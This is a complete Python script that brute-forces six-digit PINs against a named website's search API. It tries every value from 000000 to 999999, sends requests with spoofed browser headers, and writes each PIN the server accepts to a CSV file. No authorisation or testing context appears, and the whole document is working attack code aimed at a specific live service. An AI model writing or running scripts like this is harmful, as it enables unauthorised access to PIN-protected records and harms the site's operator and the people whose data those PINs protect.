import requests
import csv

pin_count = 0
for i in range(0, 1000000):
    before_code = ""
    pin_number = pin_count + i
    pin_initial_code = str(pin_number)
    # print("initial code : ", pin_initial_code)
    for j in range(6-len(pin_initial_code)):
        before_code = before_code + "0"
    pin_code = before_code + pin_initial_code
    print(pin_code)
    
    url = "https://viewlogies-dev.com/client/v2/search"
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-US,en;q=0.9,ko;q=0.8",
        "content-type": "application/json",
        "sec-ch-ua": "\"Google Chrome\";v=\"123\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "Referer": "https://www.viewlogies.net/",
        "Referrer-Policy": "strict-origin-when-cross-origin"
    }
    data = {"pin": pin_code}

    response = requests.post(url, headers=headers, json=data)

    if response.ok:
        print("----------------> okay")

        result = [pin_code]
        with open('pincode.csv', mode='a', newline='', encoding='utf-8') as file:
            writer = csv.writer(file)
            writer.writerow(result)
